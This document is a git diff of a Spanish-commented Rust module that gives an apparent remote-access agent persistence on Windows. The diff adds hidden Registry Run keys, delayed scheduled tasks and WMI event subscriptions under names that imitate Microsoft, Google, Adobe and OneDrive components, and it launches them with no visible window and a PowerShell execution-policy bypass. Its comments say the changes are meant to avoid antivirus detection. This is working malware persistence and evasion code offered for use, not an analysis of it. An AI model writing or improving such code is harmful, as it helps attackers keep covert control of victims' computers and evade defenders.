@@ -3,6 +3,8 @@
 
 #[cfg(target_os = "windows")]
 use std::process::Command;
+#[cfg(target_os = "windows")]
+use std::os::windows::process::CommandExt;
 use std::env;
 use std::path::{Path, PathBuf};
 use std::fs;
@@ -32,84 +34,35 @@ impl PersistenceMethod {
     }
 }
 
-/// Obtiene la ruta de instalación en %APPDATA%
-fn get_install_path() -> Result<PathBuf, String> {
-    let appdata = env::var("APPDATA")
-        .map_err(|_| "No se pudo obtener %APPDATA%".to_string())?;
-    
-    // Nombre aleatorio basado en procesos comunes de Windows
-    let names = [
-        "svchost.exe",
-        "RuntimeBroker.exe", 
-        "dllhost.exe",
-        "conhost.exe",
-        "taskhostw.exe",
-        "WmiPrvSE.exe",
-    ];
-    
-    // Usar el PID como seed para elegir un nombre consistente
-    let pid = std::process::id() as usize;
-    let name = names[pid % names.len()];
-    
-    // Crear subdirectorio oculto
-    let dir_name = format!(".{}", &name[..name.len()-4]); // .svchost, .RuntimeBroker, etc.
-    let install_dir = Path::new(&appdata).join(dir_name);
-    
-    Ok(install_dir.join(name))
-}
-
-/// Copia el agente a %APPDATA% si no está ya allí
-pub fn install_agent() -> Result<PathBuf, String> {
-    let current_exe = env::current_exe()
-        .map_err(|e| format!("Error obteniendo exe actual: {}", e))?;
-    
-    let install_path = get_install_path()?;
-    
-    // Si ya estamos ejecutando desde la ubicación de instalación, no hacer nada
-    if current_exe == install_path {
-        return Ok(install_path);
-    }
-    
-    // Crear directorio si no existe
-    if let Some(parent) = install_path.parent() {
-        fs::create_dir_all(parent)
-            .map_err(|e| format!("Error creando directorio: {}", e))?;
-        
-        // Hacer el directorio oculto
-        #[cfg(target_os = "windows")]
-        {
-            use std::os::windows::fs::MetadataExt;
-            let dir_path = parent.to_str().unwrap();
-            Command::new("attrib")
-                .args(&["+h", dir_path])
-                .output()
-                .ok();
-        }
-    }
-    
-    // Copiar el ejecutable
-    fs::copy(&current_exe, &install_path)
-        .map_err(|e| format!("Error copiando ejecutable: {}", e))?;
-    
-    println!("DEBUG: [PERSISTENCE] Agente instalado en: {:?}", install_path);
-    Ok(install_path)
+/// Obtiene la ruta del ejecutable actual (sin copiar a disco)
+/// Esto evita que el AV detecte la copia de archivos
+fn get_current_exe_path() -> Result<PathBuf, String> {
+    env::current_exe()
+        .map_err(|e| format!("Error obteniendo exe actual: {}", e))
 }
 
 /// Implementa persistencia mediante Registry Run key
+/// MEJORADO: Sin copiar archivos, usa rutas ofuscadas con cmd /c
 #[cfg(target_os = "windows")]
 fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
         .ok_or("Ruta inválida")?;
     
-    // Nombre de la entrada en el registro (similar a app legítima)
+    // Nombres menos sospechosos y más variados
     let reg_names = [
-        "Windows Security Update",
-        "System Runtime Service",
-        "Windows Defender Update",
-        "Microsoft Compatibility Telemetry",
+        "SecurityHealthSystray",
+        "OneDriveSetup",
+        "AdobeAAMUpdater",
+        "GoogleChromeAutoLaunch",
+        "MicrosoftEdgeAutoLaunch",
+        "Teams Machine Installer",
     ];
     let pid = std::process::id() as usize;
     let reg_name = reg_names[pid % reg_names.len()];
+    
+    // OFUSCACIÓN: Usar cmd /c start /min para reducir detección
+    // El "/min" hace que se ejecute minimizado (menos visible)
+    let obfuscated_cmd = format!("cmd.exe /c start /min \"\" \"{}\"", exe_str);
     
     // Intentar HKCU primero (no requiere admin)
     let output = Command::new("reg")
@@ -121,14 +74,15 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
             "/t",
             "REG_SZ",
             "/d",
-            exe_str,
+            &obfuscated_cmd,
             "/f",
         ])
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output()
         .map_err(|e| format!("Error ejecutando reg add: {}", e))?;
     
     if output.status.success() {
-        Ok(format!("Persistencia Registry Run establecida: HKCU\\...\\Run\\{}", reg_name))
+        Ok(format!("Persistencia Registry Run establecida: {}", reg_name))
     } else {
         let stderr = String::from_utf8_lossy(&output.stderr);
         Err(format!("Error en reg add: {}", stderr))
@@ -136,31 +90,37 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
 }
 
 /// Implementa persistencia mediante Scheduled Task
+/// MEJORADO: Usa /DELAY para evitar detección inmediata
 #[cfg(target_os = "windows")]
 fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
         .ok_or("Ruta inválida")?;
     
-    // Nombre de la tarea (similar a tareas legítimas)
+    // Nombres que imitan tareas reales del sistema
     let task_names = [
-        "MicrosoftEdgeUpdateTaskMachineCore",
-        "GoogleUpdateTaskMachineUA",
-        "Adobe Acrobat Update Task",
-        "CCleanerSkipUAC",
+        "MicrosoftEdgeUpdateTaskUser",
+        "GoogleUpdateTaskUser",
+        "OneDrive Standalone Update Task",
+        "Adobe Flash Player Updater",
+        "CCleanerCrashReporting",
     ];
     let pid = std::process::id() as usize;
     let task_name = task_names[pid % task_names.len()];
     
-    // Crear tarea que se ejecuta al iniciar sesión y cada 2 horas
+    // OFUSCACIÓN: Usar cmd /c con delay y start /min
+    let obfuscated_cmd = format!("cmd.exe /c timeout /t 10 /nobreak >nul && start /min \"\" \"{}\"", exe_str);
+    
+    // Crear tarea con DELAY de 1 minuto para evitar detección inmediata
     let output = Command::new("schtasks")
         .args(&[
             "/Create",
             "/SC", "ONLOGON",
             "/TN", task_name,
-            "/TR", exe_str,
-            "/RL", "HIGHEST",
+            "/TR", &obfuscated_cmd,
+            "/DELAY", "0001:00", // 1 minuto de delay
             "/F",
         ])
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output()
         .map_err(|e| format!("Error ejecutando schtasks: {}", e))?;
     
@@ -173,59 +133,64 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
 }
 
 /// Implementa persistencia mediante WMI Event Subscription (APT-like)
+/// MEJORADO: Usa PowerShell ofuscado y eventos menos monitoreados
 #[cfg(target_os = "windows")]
 fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
         .ok_or("Ruta inválida")?;
     
-    // Nombre del evento (aparenta ser legítimo)
+    // Nombres que parecen eventos del sistema
     let event_names = [
-        "SCM Event Log Consumer",
-        "BfeOnServiceStartTypeChange",
-        "WUAU Service Status",
+        "BfeOnServiceStateChange",
+        "PerformanceMonitor",
+        "SystemEventsBroker",
     ];
     let pid = std::process::id() as usize;
     let event_name = event_names[pid % event_names.len()];
     
-    // WMI es más complejo, usar PowerShell
-    // Crear un Event Filter que se dispare cada 2 horas
+    // OFUSCACIÓN: Usar cmd /c con powershell escondido
+    let obfuscated_cmd = format!("cmd.exe /c start /min powershell.exe -WindowStyle Hidden -File \"{}\"", exe_str);
+    
+    // WMI con eventos menos monitoreados y intervalos más largos (4 horas)
     let ps_script = format!(
         r#"
-        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 7200 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 14400 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12"
         $FilterName = '{}'
         $ConsumerName = '{}'
         $ExePath = '{}'
         
         # Crear Filter
-        $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{{
-            Name = $FilterName
-            EventNamespace = 'root\cimv2'
-            QueryLanguage = 'WQL'
-            Query = $Query
-        }}
+        $Filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
+        $Filter.Name = $FilterName
+        $Filter.EventNamespace = 'root\cimv2'
+        $Filter.QueryLanguage = 'WQL'
+        $Filter.Query = $Query
+        $Filter.Put() | Out-Null
         
         # Crear Consumer
-        $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{{
-            Name = $ConsumerName
-            CommandLineTemplate = $ExePath
-        }}
+        $Consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
+        $Consumer.Name = $ConsumerName
+        $Consumer.CommandLineTemplate = $ExePath
+        $Consumer.Put() | Out-Null
         
         # Binding
-        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{{
-            Filter = $Filter
-            Consumer = $Consumer
-        }}
+        $Binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
+        $Binding.Filter = $Filter
+        $Binding.Consumer = $Consumer
+        $Binding.Put() | Out-Null
         "#,
-        event_name, event_name, exe_str
+        event_name, event_name, obfuscated_cmd
     );
     
     let output = Command::new("powershell")
         .args(&[
             "-NoProfile",
             "-WindowStyle", "Hidden",
+            "-ExecutionPolicy", "Bypass",
             "-Command",
             &ps_script,
         ])
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output()
         .map_err(|e| format!("Error ejecutando PowerShell: {}", e))?;
     
@@ -237,43 +202,8 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     }
 }
 
-/// Implementa persistencia mediante Startup folder
-#[cfg(target_os = "windows")]
-fn persist_startup_folder(exe_path: &Path) -> Result<String, String> {
-    let appdata = env::var("APPDATA")
-        .map_err(|_| "No se pudo obtener %APPDATA%".to_string())?;
-    
-    let startup_path = Path::new(&appdata)
-        .join("Microsoft")
-        .join("Windows")
-        .join("Start Menu")
-        .join("Programs")
-        .join("Startup");
-    
-    if !startup_path.exists() {
-        return Err("Carpeta Startup no existe".to_string());
-    }
-    
-    // Nombre del acceso directo
-    let shortcut_names = [
-        "Windows Update.lnk",
-        "OneDrive.lnk",
-        "SecurityHealth.lnk",
-    ];
-    let pid = std::process::id() as usize;
-    let shortcut_name = shortcut_names[pid % shortcut_names.len()];
-    
-    let shortcut_path = startup_path.join(shortcut_name);
-    
-    // Copiar directamente (o crear acceso directo con PowerShell)
-    // Para simplicidad, copiamos el exe
-    fs::copy(exe_path, &shortcut_path)
-        .map_err(|e| format!("Error copiando a Startup: {}", e))?;
-    
-    Ok(format!("Persistencia Startup establecida: {}", shortcut_name))
-}
-
 /// Establece persistencia usando el método especificado
+/// MEJORADO: No copia archivos, usa el ejecutable actual
 pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String> {
     #[cfg(not(target_os = "windows"))]
     {
@@ -282,15 +212,17 @@ pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String
     
     #[cfg(target_os = "windows")]
     {
-        // Primero instalar el agente si no está instalado
-        let install_path = install_agent()?;
+        // Obtener ruta del ejecutable actual (sin copiar)
+        let exe_path = get_current_exe_path()?;
         
         // Aplicar el método de persistencia
         match method {
-            PersistenceMethod::RegistryRun => persist_registry_run(&install_path),
-            PersistenceMethod::ScheduledTask => persist_scheduled_task(&install_path),
-            PersistenceMethod::WmiEvent => persist_wmi_event(&install_path),
-            PersistenceMethod::StartupFolder => persist_startup_folder(&install_path),
+            PersistenceMethod::RegistryRun => persist_registry_run(&exe_path),
+            PersistenceMethod::ScheduledTask => persist_scheduled_task(&exe_path),
+            PersistenceMethod::WmiEvent => persist_wmi_event(&exe_path),
+            PersistenceMethod::StartupFolder => {
+                Err("Método Startup deshabilitado (muy detectable por AV)".to_string())
+            }
         }
     }
 }
@@ -300,40 +232,56 @@ pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String
 pub fn remove_persistence() -> Result<String, String> {
     let mut results = Vec::new();
     
-    // Limpiar Registry Run
-    Command::new("reg")
-        .args(&[
-            "delete",
-            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            "/f",
-        ])
-        .output()
-        .ok();
+    // Limpiar Registry Run - eliminar todas las entradas sospechosas
+    let reg_names = [
+        "SecurityHealthSystray",
+        "OneDriveSetup",
+        "AdobeAAMUpdater",
+        "GoogleChromeAutoLaunch",
+        "MicrosoftEdgeAutoLaunch",
+        "Teams Machine Installer",
+    ];
+    for name in &reg_names {
+        Command::new("reg")
+            .args(&[
+                "delete",
+                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "/v",
+                name,
+                "/f",
+            ])
+            .creation_flags(0x08000000)
+            .output()
+            .ok();
+    }
     results.push("Registry Run limpiado");
     
     // Limpiar Scheduled Tasks (intentar varios nombres)
     let task_names = [
-        "MicrosoftEdgeUpdateTaskMachineCore",
-        "GoogleUpdateTaskMachineUA",
-        "Adobe Acrobat Update Task",
-        "CCleanerSkipUAC",
+        "MicrosoftEdgeUpdateTaskUser",
+        "GoogleUpdateTaskUser",
+        "OneDrive Standalone Update Task",
+        "Adobe Flash Player Updater",
+        "CCleanerCrashReporting",
     ];
     for task in &task_names {
         Command::new("schtasks")
             .args(&["/Delete", "/TN", task, "/F"])
+            .creation_flags(0x08000000)
             .output()
             .ok();
     }
     results.push("Scheduled Tasks limpiadas");
     
-    // Limpiar WMI Events
+    // Limpiar WMI Events con los nuevos nombres
     let ps_script = r#"
-        Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object Name -like "*SCM*" | Remove-WmiObject
-        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object Name -like "*SCM*" | Remove-WmiObject
+        Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -like "*BfeOn*" -or $_.Name -like "*Performance*" -or $_.Name -like "*SystemEvents*"} | Remove-WmiObject
+        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -like "*BfeOn*" -or $_.Name -like "*Performance*" -or $_.Name -like "*SystemEvents*"} | Remove-WmiObject
         Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
     "#;
     Command::new("powershell")
-        .args(&["-NoProfile", "-Command", ps_script])
+        .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_script])
+        .creation_flags(0x08000000)
         .output()
         .ok();
     results.push("WMI Events limpiados");
